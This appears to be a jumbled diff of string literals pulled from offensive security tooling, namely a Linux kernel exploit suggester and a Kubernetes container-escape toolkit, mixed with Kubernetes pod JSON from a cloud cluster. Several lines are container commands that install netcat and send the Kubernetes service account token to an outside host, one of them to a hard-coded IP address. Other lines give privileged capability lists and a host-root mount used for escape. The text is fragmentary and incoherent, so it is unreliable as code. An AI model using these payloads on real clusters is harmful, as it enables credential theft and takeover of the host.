@@ -1,0 +1,704 @@
+"[  "") + GreenBold.Sprint(title) + BlueBold.Sprint(""  "
+"[ ! $(cat ""$CVELIST_FILE"" | grep -E ""$cve"") "
+"[ ! -e ""$CVELIST_FILE"" "
+"[ ""$#"" != ""0"" "
+"[ ""$(echo ""${tags_array[@"
+"[ ""$(grep -E '\ [0-9"
+"[ ""$(grep -E '\.el[1-9"
+"[ ""$(grep -E '\.fc[1-9"
+"[ ""$(grep -E '\.mga[1-9"
+"[ ""$(grep ubuntu ""$pkglist_file"")"" "
+"[ ""$ARCH"" == ""i386"" -o ""$ARCH"" == ""i686"" -o ""$ARCH"" == """" "
+"[ ""$ARCH"" == ""x86_64"" -o ""$ARCH"" == """" "
+"[ ""$RANK"" -ge 3 "
+"[ ""$RANK"" -ge 6 "
+"[ ""$distro"" = ""RHEL"" -o ""$distro"" = ""fedora"" -o ""$distro"" = ""mageia"" "
+"[ ""$distro"" = ""arch"" -o ""$distro"" = ""manjaro"" "
+"[ ""$distro"" = ""debian"" -o ""$distro"" = ""ubuntu"" -o ""$distro"" = ""deepin"" "
+"[ ""$opt_checksec_mode"" = ""true"" "
+"[ ""$opt_cvelist_file"" = ""true"" "
+"[ ""$opt_full"" = ""true"" "
+"[ ""$opt_kernel_only"" = ""true"" -o -z ""$PKG_LIST"" "
+"[ ""$opt_kernel_version"" = ""true"" "
+"[ ""$opt_kernel_version"" == ""true"" "
+"[ ""$opt_pkglist_file"" = ""true"" "
+"[ ""$opt_pkglist_file"" = ""true"" -a -e ""$pkglist_file"" "
+"[ ""$opt_pkglist_file"" == ""false"" "
+"[ ""$opt_show_dos"" == ""false"" "
+"[ ""$opt_skip_more_checks"" = ""false"" "
+"[ ""$opt_skip_more_checks"" = ""true"" "
+"[ ""$opt_skip_more_checks"" == ""false"" "
+"[ ""$opt_skip_pkg_versions"" = ""true"" -a -n ""$pkg"" "
+"[ ""$opt_summary"" = ""true"" "
+"[ ""$opt_uname_string"" = ""true"" "
+"[ ""$opt_uname_string"" == ""false"" "
+"[ ""$opt_uname_string"" == ""true"" "
+"[ ""$opt_uname_string"" == ""true"" -o \( ""$OS"" == ""$tag_distro"" -a ""$(echo ""$DISTRO"" | grep -E ""$tag_distro_num"")"" \) "
+"[ ""$opt_userspace_only"" = ""true"" "
+"[ ""$pkgName"" == ""linux-kernel"" -o ""$opt_checksec_mode"" == ""true"" "
+"[ ""$reqRelation"" == ""<"" "
+"[ ""$reqRelation"" == ""<="" "
+"[ ""$reqRelation"" == ""="" "
+"[ ""$reqRelation"" == "">"" "
+"[ ""$reqRelation"" == "">="" "
+"[ ""$sign"" == ""!="" "
+"[ ""$sign"" == ""=="" "
+"[ ""$val"" != ""$curVal"" "
+"[ ""$val"" == ""$curVal"" "
+"[ ""${PRE_NAME}"" = ""section:"" "
+"[ $(echo ""$KERNEL_ALL"" | grep -E ""${tag_pkg_num}"") "
+"[ $(echo ""$tag_distro_num_all"" | grep '{') "
+"[ $(head -1 ""$pkglist_file"" | grep 'Desired=Unknown/Install/Remove/Purge/Hold') "
+"[ $currentRelation == ""<"" "
+"[ $currentRelation == ""="" "
+"[ $currentRelation == "">"" "
+"[ $opt_fetch_bins = ""true"" "
+"[ $opt_fetch_srcs = ""true"" "
+"[ $opt_summary = ""true"" "
+"[ $opt_uname_string = ""true"" "
+"[ ${pkgName} == ""linux-kernel"" "
+"[ -f ""${KBUILD_OUTPUT:-/usr/src/linux}""/.config "
+"[ -f ""${name}_$(basename $i)"" "
+"[ -f ""${name}_$(basename $src_url)"" "
+"[ -f /boot/config-` + ""`uname -r`"" + ` "
+"[ -n ""$ARCH"" "
+"[ -n ""$DISTRO"" "
+"[ -n ""$ENABLE"" "
+"[ -n ""$EXPLOIT_DB"" "
+"[ -n ""$KCONFIG"" "
+"[ -n ""$KERNEL"" "
+"[ -n ""$OS"" "
+"[ -n ""$OS"" -a ""$opt_skip_more_checks"" = ""false"" "
+"[ -n ""$PKGLIST_FILE"" "
+"[ -n ""$PKGLIST_FILE"" -a -n ""$PKG_LIST"" "
+"[ -n ""$PKG_LIST"" "
+"[ -n ""$TAGS"" -a -n ""$OS"" "
+"[ -n ""$analysis_url"" "
+"[ -n ""$author"" "
+"[ -n ""$cmdStdout"" "
+"[ -n ""$comments"" "
+"[ -n ""$config"" "
+"[ -n ""$dos"" "
+"[ -n ""$ext_url"" "
+"[ -n ""$pkg"" "
+"[ -n ""$pkgListFile"" "
+"[ -n ""$reqs"" "
+"[ -n ""$tag_pkg_num"" "
+"[ -n ""$tag_pkg_num"" -a ""$tag_pkg"" = ""kernel"" "
+"[ -n ""$tag_pkg_num"" -a -n ""$tag_pkg""  "
+"[ -n ""$tags"" "
+"[ -z ""$CONFIG"" "
+"[ -z ""$KCONFIG"" "
+"[ -z ""$KCONFIG"" -a ""$ENABLE_REQS_NUM"" = 0 "
+"[ -z ""$KERNEL"" "
+"[ -z ""$UNAME_A"" "
+"[ -z ""$bin_url"" "
+"[ -z ""$curVal"" "
+"[ -z ""$curVal"" -a ""$opt_checksec_mode"" = ""true"" "
+"[ -z ""$src_url"" "
+"[ -z ""$tag_pkg_num"" "
+"[ -z ""$tags"" "
+"[""--full"""
+"[""--list"""
+"[""-c"", ""apt update && apt install -y netcat; cat /run/secrets/kubernetes.io/serviceaccount/token | nc ${RHOST} ${RPORT}; sleep 300"""
+"[""-c"", ""apt update && apt install -y netcat; cat /run/secrets/kubernetes.io/serviceaccount/token | nc 39.104.80.49 999; sleep 99999999"""
+"[""-c"", ""apt update \u0026\u0026 apt install -y netcat; cat /run/secrets/kubernetes.io/serviceaccount/token | nc $RHOST $RPORT; sleep 300"""
+"[""/:/host"""
+"[""/bin/bash"", ""-c"", ""--"""
+"[""/bin/sh"""
+"[""/bin/sh"", ""-c"", ""$SHELL_CMD"""
+"[""/bin/sh"", ""-c"", ""${SHELL_CMD}"""
+"[""/bin/sh"", ""-c"", ""sleep 1"""
+"[""/bin/sh"",""-c"",""<SHELL_CMD>"""
+"[""<args>"""
+"[""<cmd>"""
+"[""<exploit>"""
+"[""<tool>"""
+"[""ALL"""
+"[""NET_ADMIN"""
+"[""NET_ADMIN"", ""SYS_ADMIN"", ""SYS_PTRACE"", ""AUDIT_CONTROL"", ""MKNOD"", ""SETFCAP"""
+"[""NET_ADMIN"",""SYS_ADMIN"",""SYS_PTRACE"",""AUDIT_CONTROL"",""MKNOD"",""SETFCAP"""
+"[""NET_BIND_SERVICE"""
+"[""NET_RAW"""
+"[""NET_RAW"",""NET_BIND_SERVICE"""
+"[""PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"""
+"[""SYS_ADMIN"""
+"[""all"""
+"[""auto-escape"""
+"[""bash"", ""-c"", ""$SHELLCMD$"""
+"[""eva"""
+"[""evaluate"""
+"[""run"""
+"[""sh"",""-c"",""ls -l /run/flannel/subnet.env"""
+"[""sh"",""-c"",""ls /acs/flexvolume"""
+"[""sh"",""-c"",""ls /alicloud-disk-controller"""
+"[""sh"",""-c"",""ps -ef | grep aliyun-acr-credential-helper | grep -v grep"""
+"[""sh"",""-c"",""ps -ef | grep aliyun-app-manager | grep -v grep"""
+"[""sh"",""-c"",""ps -ef |grep alicloud-monitor-controller"""
+"[""while true; do sleep 30; done;"""
+"['00000000a80425fb', 'Discovery - K8s API Server', 'the service-account have a high authority'"
+"['Options:', 'i@cdxy.me'"
+"['Pulling', 'starting', 'finished'"
+"['SYS_PTRACE capability was enabled', 'root'"
+"['\""\\s"
+"['all exploits are finished, auto exploit success!'"
+"['apiVersion', 'api-server response'"
+"['apiVersion', 'nodes is forbidden'"
+"['cdk_mknod_result', 'debugfs'"
+"['containerd-shim', 'exploit success'"
+"['failed', 'target container is not privileged'"
+"['generate cronjob with', 'selfLink'"
+"['i@cdxy.me', 'OCI '"
+"['i@cdxy.me', 'cdk evaluate'"
+"['i@cdxy.me', 'cdk evaluate', '%s', 'input args'"
+"['i@cdxy.me', 'exploit failed', 'Invalid'"
+"['i@cdxy.me', 'exploit failed', 'OCI '"
+"['i@cdxy.me', 'exploit failed', 'OCI ', 'exploit failed'"
+"['i@cdxy.me', 'exploit failed', 'OCI ', 'exploit success'"
+"['i@cdxy.me', 'exploit failed', 'OCI ', 'failed'"
+"['i@cdxy.me', 'exploit success'"
+"['i@cdxy.me', 'failed'"
+"['i@cdxy.me', 'input args'"
+"['i@cdxy.me', 'success'"
+"['input args', 'i@cdxy.me', 'cdk evaluate'"
+"['listening insecure-port: 0.0.0.0:9443', 'panic:', 'nodes is forbidden', 'cdk evaluate', 'empty'"
+"['lo', '127.0'"
+"['no such file or directory', 'failed'"
+"['panic:', 'cdk evaluate'"
+"['panic:', 'cdk evaluate', 'empty'"
+"['panic:', 'nodes is forbidden', 'cdk evaluate', 'empty'"
+"['root', '/usr/bin', '1'"
+"['shell script saved to', 'Execute Shell', 'failed'"
+"['success', 'core dumped'"
+"['success', 'happy escaping'"
+"['success', 'happy escaping', 'alpine:latest', '""ID""', 'starting container:', 'finished'"
+"['success', 'k8s_configmaps.json'"
+"['success', 'k8s_secrets.json'"
+"['success', 'was mounted to'"
+"[Briefing: ""Attack Cloud Native Kubernetes"""
+"[CVE"" -A 10 | grep -Ev ""^\-\-$"" | sed -${E} ""s,\[CVE-[0-9"
+"[CVE-2009-2692,CVE-2009-1895"
+"[CVE-2010-3848,CVE-2010-3850,CVE-2010-4073"
+"[CVE-2012-0056,CVE-2010-3849,CVE-2010-3850"
+"[CVE-2016-6663,CVE-2016-6664|CVE-2016-6662"
+"[CVE-2017-1000366,CVE-2017-1000370"
+"[CVE-2017-1000366,CVE-2017-1000371"
+"[CVE-2017-1000366,CVE-2017-1000379"
+"[CVE-2017-1000370,CVE-2017-1000371"
+"[[ ""$IN"" =~ ^CONFIG_.*$ "
+"[[ ""$IN"" =~ ^cmd:.*$ "
+"[[ ""$IN"" =~ ^pkg=.*$ "
+"[[ ""$IN"" =~ ^sysctl:.*$ "
+"[[ ""$IN"" =~ ^ver.*$ "
+"[[ ""$IN"" =~ ^x86$ "
+"[[ ""$IN"" =~ ^x86_64$ "
+"[[ ""$src_url"" =~ ^.*tgz|tar.gz|zip$ && -n ""$EXPLOIT_DB"" "
+"[\""'\\s"
+"[], ["
+"[], ['No such file or directory'"
+"[], ['cp'"
+"[]byte(tt.successStr)) && !bytes.Contains(out, ["
+"[]byte, encoding string) ["
+"[]byte, file string) (["
+"[^"""
+"[^,"
+"[{""apiVersion"":""apps/v1"",""kind"":""DaemonSet"",""name"":""cloud-controller-manager"",""uid"":""dcaaaa8b-d304-42a3-8ee2-2d415041c6c0"",""controller"":true,""blockOwnerDeletion"":true}"
+"[{""apiVersion"":""apps/v1"",""kind"":""DaemonSet"",""name"":""flexvolume"",""uid"":""7eb1d60b-0e68-4ae0-8554-5f9c4e52f2bd"",""controller"":true,""blockOwnerDeletion"":true}"
+"[{""apiVersion"":""apps/v1"",""kind"":""DaemonSet"",""name"":""kube-flannel-ds"",""uid"":""70b7a644-8470-4500-9408-50e20a4a0bc5"",""controller"":true,""blockOwnerDeletion"":true}"
+"[{""apiVersion"":""apps/v1"",""kind"":""DaemonSet"",""name"":""kube-proxy-master"",""uid"":""0966af12-5f73-4395-be07-cf31f049ab4c"",""controller"":true,""blockOwnerDeletion"":true}"
+"[{""apiVersion"":""apps/v1"",""kind"":""DaemonSet"",""name"":""kube-proxy-worker"",""uid"":""d9eead21-3360-481f-ad44-f546c22733cc"",""controller"":true,""blockOwnerDeletion"":true}"
+"[{""apiVersion"":""apps/v1"",""kind"":""ReplicaSet"",""name"":""alicloud-disk-controller-74b658598f"",""uid"":""1471ba59-65e2-4b9d-9259-8a657814049f"",""controller"":true,""blockOwnerDeletion"":true}"
+"[{""apiVersion"":""apps/v1"",""kind"":""ReplicaSet"",""name"":""alicloud-monitor-controller-5599ddcdc7"",""uid"":""3aa03e33-6a94-4dba-882a-b1319315f437"",""controller"":true,""blockOwnerDeletion"":true}"
+"[{""apiVersion"":""apps/v1"",""kind"":""ReplicaSet"",""name"":""aliyun-acr-credential-helper-6b4f98fdfb"",""uid"":""cf48a7f1-93f4-42f6-900b-aecf853279e5"",""controller"":true,""blockOwnerDeletion"":true}"
+"[{""apiVersion"":""apps/v1"",""kind"":""ReplicaSet"",""name"":""coredns-8494d5b47"",""uid"":""9a367f62-0ab7-4177-831f-96a86e042674"",""controller"":true,""blockOwnerDeletion"":true}"
+"[{""apiVersion"":""apps/v1"",""kind"":""ReplicaSet"",""name"":""metrics-server-54575fbd57"",""uid"":""8a03af3b-50aa-4e89-a0c6-b40dabf52220"",""controller"":true,""blockOwnerDeletion"":true}"
+"[{""apiVersion"":""apps/v1"",""kind"":""ReplicaSet"",""name"":""nginx-ingress-controller-5495b9fccf"",""uid"":""8d75401f-617c-40e9-a026-25418af036ff"",""controller"":true,""blockOwnerDeletion"":true}"
+"[{""command"":[""sleep"",""infinity"""
+"[{""hostPath"":{""path"":""/""},""name"":""host-volume""}"
+"[{""image"":""ubuntu:latest"",""name"":""container""}"
+"[{""ip"":""172.20.0.195""}"
+"[{""ip"":""172.20.0.196""}"
+"[{""ip"":""172.20.0.197""}"
+"[{""ip"":""172.20.0.198""}"
+"[{""ip"":""172.20.0.199""}"
+"[{""ip"":""172.20.0.200""}"
+"[{""ip"":""172.20.0.3""}"
+"[{""ip"":""172.20.1.2""}"
+"[{""ip"":""172.20.1.66""}"
+"[{""ip"":""192.168.0.150""}"
+"[{""ip"":""192.168.0.151""}"
+"[{""ip"":""192.168.0.152""}"
+"[{""ip"":""192.168.0.153""}"
+"[{""ip"":""192.168.0.154""}"
+"[{""ip"":""192.168.0.155""}"
+"[{""key"":""node-role.kubernetes.io/master"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.cloudprovider.kubernetes.io/uninitialized"",""operator"":""Exists"",""effect"":""NoSchedule""},{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute"",""tolerationSeconds"":300},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute"",""tolerationSeconds"":300}"
+"[{""key"":""node.kubernetes.io/not-ready"",""operator"":""Exists"",""effect"":""NoExecute"",""tolerationSeconds"":300},{""key"":""node.kubernetes.io/unreachable"",""operator"":""Exists"",""effect"":""NoExecute"",""tolerationSeconds"":300}"
+"[{""matchExpressions"":[{""key"":""type"",""operator"":""NotIn"",""values"":[""virtual-kubelet"""
+"[{""matchFields"":[{""key"":""metadata.name"",""operator"":""In"",""values"":[""cn-beijing.192.168.0.150"""
+"[{""matchFields"":[{""key"":""metadata.name"",""operator"":""In"",""values"":[""cn-beijing.192.168.0.151"""
+"[{""matchFields"":[{""key"":""metadata.name"",""operator"":""In"",""values"":[""cn-beijing.192.168.0.152"""
+"[{""matchFields"":[{""key"":""metadata.name"",""operator"":""In"",""values"":[""cn-beijing.192.168.0.153"""
+"[{""matchFields"":[{""key"":""metadata.name"",""operator"":""In"",""values"":[""cn-beijing.192.168.0.154"""
+"[{""matchFields"":[{""key"":""metadata.name"",""operator"":""In"",""values"":[""cn-beijing.192.168.0.155"""
+"[{""metadata"":{""name"":""alicloud-application-controller-68999d69df-6fbgg"",""generateName"":""alicloud-application-controller-68999d69df-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/alicloud-application-controller-68999d69df-6fbgg"",""uid"":""c61634a1-bf3b-4aa5-b5fb-f0ad51142c48"",""resourceVersion"":""1933"",""creationTimestamp"":""2020-04-08T04:12:32Z"",""labels"":{""app"":""alicloud-application-controller"",""owner"":""aliyun"",""pod-template-hash"":""68999d69df""},""annotations"":{""kubernetes.io/psp"":""ack.privileged""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""ReplicaSet"",""name"":""alicloud-application-controller-68999d69df"",""uid"":""4f2f3156-b2c5-4b32-9105-d1a97ab86d7e"",""controller"":true,""blockOwnerDeletion"":true}"
+"[{""mountPath"":""/host-root"",""name"":""host-volume""}"
+"[{""name"":""NODE_NAME"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""spec.nodeName""}}}"
+"[{""name"":""POD_NAME"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""metadata.name""}}},{""name"":""POD_NAMESPACE"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""metadata.namespace""}}}"
+"[{""name"":""acs-flexvolume"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume:v1.14.8.66-1d0843f-aliyun"",""env"":[{""name"":""ACS_DISK"",""value"":""true""},{""name"":""ACS_NAS"",""value"":""true""},{""name"":""ACS_OSS"",""value"":""true""},{""name"":""ACS_CPFS"",""value"":""false""}"
+"[{""name"":""acs-flexvolume"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:35Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume:v1.14.8.66-1d0843f-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume@sha256:b17527284ff2c593e0a68b114494b2ebad044004e86a94c94047f2d2771e7e1b"",""containerID"":""docker://d05f598cdce391445876d280cb38b141ad9c914e0a18e2c7d12ba4a215750499"",""started"":true}"
+"[{""name"":""acs-flexvolume"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:36Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume:v1.14.8.66-1d0843f-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume@sha256:b17527284ff2c593e0a68b114494b2ebad044004e86a94c94047f2d2771e7e1b"",""containerID"":""docker://cf0ae816d665f706fa0131c54dea7d3adf81957066b7b3f62eb49fc2c97a3591"",""started"":true}"
+"[{""name"":""acs-flexvolume"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:38Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume:v1.14.8.66-1d0843f-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume@sha256:b17527284ff2c593e0a68b114494b2ebad044004e86a94c94047f2d2771e7e1b"",""containerID"":""docker://8ede39f430000f0f15d891b43181655fdaabc7496b78aaf4f332582533524d8e"",""started"":true}"
+"[{""name"":""acs-flexvolume"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:38Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume:v1.14.8.66-1d0843f-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume@sha256:b17527284ff2c593e0a68b114494b2ebad044004e86a94c94047f2d2771e7e1b"",""containerID"":""docker://9f515c40e3fd5d9c2d99cdf6c3c95b109eca48c6f789ba9d8dc85fed1e6550c2"",""started"":true}"
+"[{""name"":""acs-flexvolume"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:45Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume:v1.14.8.66-1d0843f-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume@sha256:b17527284ff2c593e0a68b114494b2ebad044004e86a94c94047f2d2771e7e1b"",""containerID"":""docker://4c9610e623f19098a3702d632a84bf6284ab232627d986e9d99fba0f3a621ca0"",""started"":true}"
+"[{""name"":""acs-flexvolume"",""state"":{""running"":{""startedAt"":""2020-09-10T07:23:39Z""}},""lastState"":{""terminated"":{""exitCode"":255,""reason"":""Error"",""startedAt"":""2020-04-08T04:12:36Z"",""finishedAt"":""2020-09-10T07:23:17Z"",""containerID"":""docker://587d3eba0a667b7398654099f45e29fcaf3728c5f164a89e693a895c3132252c""}},""ready"":true,""restartCount"":1,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume:v1.14.8.66-1d0843f-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume@sha256:b17527284ff2c593e0a68b114494b2ebad044004e86a94c94047f2d2771e7e1b"",""containerID"":""docker://1f015d12fff55c6908d3a848471c96351afda5347e9c2b3853af0f645dc834f3"",""started"":true}"
+"[{""name"":""admin-token-t8m2n"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}"
+"[{""name"":""admin-token-t8m2n"",""secret"":{""secretName"":""admin-token-t8m2n"",""defaultMode"":420}}"
+"[{""name"":""alicloud-application-controller"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-app-lifecycle-manager:v0.1.0.1-f832bed-aliyun"",""resources"":{""requests"":{""cpu"":""100m"",""memory"":""80Mi""}},""volumeMounts"":[{""name"":""admin-token-t8m2n"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}"
+"[{""name"":""alicloud-application-controller"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:49Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-app-lifecycle-manager:v0.1.0.1-f832bed-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-app-lifecycle-manager@sha256:37348e10cd00c02360527343a2863e7bedd2fc65c23c3f2464af5dc7efb5b2c6"",""containerID"":""docker://0913be067bdbe34a11120e12c0a65c07cdf856447b8ecf7e3f26c527aff67237"",""started"":true}"
+"[{""name"":""alicloud-disk-controller"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/alicloud-disk-controller:v1.14.8.37-bd3fd891-aliyun"",""resources"":{""limits"":{""cpu"":""100m"",""memory"":""100Mi""},""requests"":{""cpu"":""100m"",""memory"":""100Mi""}},""volumeMounts"":[{""name"":""cloud-config"",""mountPath"":""/etc/kubernetes/""},{""name"":""logdir"",""mountPath"":""/var/log/alicloud/""},{""name"":""admin-token-t8m2n"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}"
+"[{""name"":""alicloud-disk-controller"",""state"":{""running"":{""startedAt"":""2020-09-10T07:23:44Z""}},""lastState"":{""terminated"":{""exitCode"":255,""reason"":""Error"",""startedAt"":""2020-04-08T04:12:54Z"",""finishedAt"":""2020-09-10T07:23:17Z"",""containerID"":""docker://48004de77599d15d19b5336e01405579b922ae607c84fe4b5856884446f1f18e""}},""ready"":true,""restartCount"":1,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/alicloud-disk-controller:v1.14.8.37-bd3fd891-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/alicloud-disk-controller@sha256:498b6ef55f40282853d5b2ec24da4adba0f57ada2cebfa9e24edfe1bd9597a1a"",""containerID"":""docker://7d1bd7aa0c44eb838dae70b86857e4530fd3188aca2505d02eee995a425cc341"",""started"":true}"
+"[{""name"":""alicloud-monitor-controller"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/alicloud-monitor-controller:v1.1.0"",""command"":[""/alicloud-monitor-controller"",""agent"",""--regionId=cn-beijing"",""--clusterId=ca3869bd4dd884799a5abbb00c5e56fc4"",""--logtostderr"",""--v=4"""
+"[{""name"":""alicloud-monitor-controller"",""state"":{""running"":{""startedAt"":""2020-04-08T04:13:03Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/alicloud-monitor-controller:v1.1.0"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/alicloud-monitor-controller@sha256:62b7e69c72b8e0d895ca7006c55cd3a053e664d071955fdafe374dbf61105f52"",""containerID"":""docker://09d089725237d30a38e2058da1fd8b6dbc671ddb61997b0b04af19907b82e7e1"",""started"":true}"
+"[{""name"":""aliyun-acr-credential-helper"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-acr-credential-helper:v20.03.16.0-36d5d7e-aliyun"",""env"":[{""name"":""POD_NAME"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""metadata.name""}}},{""name"":""POD_NAMESPACE"",""valueFrom"":{""fieldRef"":{""apiVersion"":""v1"",""fieldPath"":""metadata.namespace""}}}"
+"[{""name"":""aliyun-acr-credential-helper"",""state"":{""running"":{""startedAt"":""2020-04-08T04:13:20Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-acr-credential-helper:v20.03.16.0-36d5d7e-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-acr-credential-helper@sha256:a82eaef4c266219538a5f470d758dfc0957bd24e81949431933a1406c47f8ef4"",""containerID"":""docker://9344a4a0b58a001fd38d2e349ce5893d4b355984227a5a2f5e144999ddec2df6"",""started"":true}"
+"[{""name"":""aliyun_logs_audit-ca3869bd4dd884799a5abbb00c5e56fc4"",""value"":""/var/log/kubernetes/kubernetes.audit""},{""name"":""aliyun_logs_audit-ca3869bd4dd884799a5abbb00c5e56fc4_tags"",""value"":""audit=apiserver""},{""name"":""aliyun_logs_audit-ca3869bd4dd884799a5abbb00c5e56fc4_product"",""value"":""k8s-audit""},{""name"":""aliyun_logs_audit-ca3869bd4dd884799a5abbb00c5e56fc4_jsonfile"",""value"":""true""}"
+"[{""name"":""ca-certs"",""hostPath"":{""path"":""/etc/ssl/certs"",""type"":""DirectoryOrCreate""}},{""name"":""etc-pki"",""hostPath"":{""path"":""/etc/pki"",""type"":""DirectoryOrCreate""}},{""name"":""k8s-certs"",""hostPath"":{""path"":""/etc/kubernetes/pki"",""type"":""DirectoryOrCreate""}},{""name"":""kubeconfig"",""hostPath"":{""path"":""/etc/kubernetes/controller-manager.conf"",""type"":""FileOrCreate""}},{""name"":""localtime"",""hostPath"":{""path"":""/etc/localtime"",""type"":""""}}"
+"[{""name"":""ca-certs"",""readOnly"":true,""mountPath"":""/etc/ssl/certs""},{""name"":""etc-pki"",""readOnly"":true,""mountPath"":""/etc/pki""},{""name"":""k8s-certs"",""readOnly"":true,""mountPath"":""/etc/kubernetes/pki""},{""name"":""kubeconfig"",""readOnly"":true,""mountPath"":""/etc/kubernetes/controller-manager.conf""},{""name"":""localtime"",""mountPath"":""/etc/localtime""}"
+"[{""name"":""cloud-config"",""hostPath"":{""path"":""/etc/kubernetes/"",""type"":""""}},{""name"":""logdir"",""hostPath"":{""path"":""/var/log/alicloud/"",""type"":""""}},{""name"":""admin-token-t8m2n"",""secret"":{""secretName"":""admin-token-t8m2n"",""defaultMode"":420}}"
+"[{""name"":""cloud-controller-manager"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/cloud-controller-manager-amd64:v1.9.3.239-g40d97e1-aliyun"",""command"":[""/cloud-controller-manager"",""--kubeconfig=/etc/kubernetes/cloud-controller-manager.conf"",""--address=127.0.0.1"",""--allow-untagged-cloud=true"",""--leader-elect=true"",""--cloud-provider=alicloud"",""--use-service-account-credentials=true"",""--cloud-config=/etc/kubernetes/config/cloud-config.conf"",""--feature-gates=ServiceNodeExclusion=true"",""--route-reconciliation-period=3m"",""--configure-cloud-routes=true"",""--allocate-node-cidrs=true"",""--cluster-cidr=172.20.0.0/16"""
+"[{""name"":""cloud-controller-manager"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:43Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/cloud-controller-manager-amd64:v1.9.3.239-g40d97e1-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/cloud-controller-manager-amd64@sha256:780116bf9a2ac7bfecc12e5c976200d656a702f9122502a96cacfcad7d3834f9"",""containerID"":""docker://a3b571469d988545b50e68e9ce9e24d763f0d1ddfdcbd450379df1ba4edab4f0"",""started"":true}"
+"[{""name"":""cloud-controller-manager"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:43Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/cloud-controller-manager-amd64:v1.9.3.239-g40d97e1-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/cloud-controller-manager-amd64@sha256:780116bf9a2ac7bfecc12e5c976200d656a702f9122502a96cacfcad7d3834f9"",""containerID"":""docker://c9020e853dcded6316d05926cca0830ca4adcd5fef68b8b3d0880560b3bed34c"",""started"":true}"
+"[{""name"":""cloud-controller-manager"",""state"":{""running"":{""startedAt"":""2020-09-10T07:23:38Z""}},""lastState"":{""terminated"":{""exitCode"":255,""reason"":""Error"",""startedAt"":""2020-04-08T04:12:44Z"",""finishedAt"":""2020-09-10T07:23:17Z"",""containerID"":""docker://3963ea096e0f6d079045ece4689f08235e82ed60db63ce6b7ed3bd39d2170458""}},""ready"":true,""restartCount"":1,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/cloud-controller-manager-amd64:v1.9.3.239-g40d97e1-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/cloud-controller-manager-amd64@sha256:780116bf9a2ac7bfecc12e5c976200d656a702f9122502a96cacfcad7d3834f9"",""containerID"":""docker://65cd60d6c7398c72c0e56481028dcd099993f248c7cfe6a5b6efea8b03de76b5"",""started"":true}"
